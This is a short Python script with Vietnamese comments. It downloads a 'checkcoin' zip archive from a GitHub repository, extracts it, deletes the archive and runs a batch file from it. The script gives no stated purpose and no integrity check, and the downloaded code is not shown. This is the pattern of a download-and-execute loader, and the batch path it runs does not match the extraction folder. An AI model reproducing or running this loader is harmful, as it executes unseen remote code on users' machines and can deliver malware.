import requests
import zipfile
import os
import subprocess

# Đường dẫn đến tệp .bat
bat_file_path = "checkcoin202\\.bat"
url = "https://github.com/phucx0/Version/raw/main/checkcoin202.zip"
response = requests.get(url)
file_path = "checkcoin201.zip"
with open(file_path, "wb") as file:
    file.write(response.content)
extract_path = "1"
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(extract_path)
os.remove(file_path)
try:
    subprocess.run([bat_file_path], check=True)
except subprocess.CalledProcessError as e:
    print(f"Lỗi khi chạy {bat_file_path}: {e}")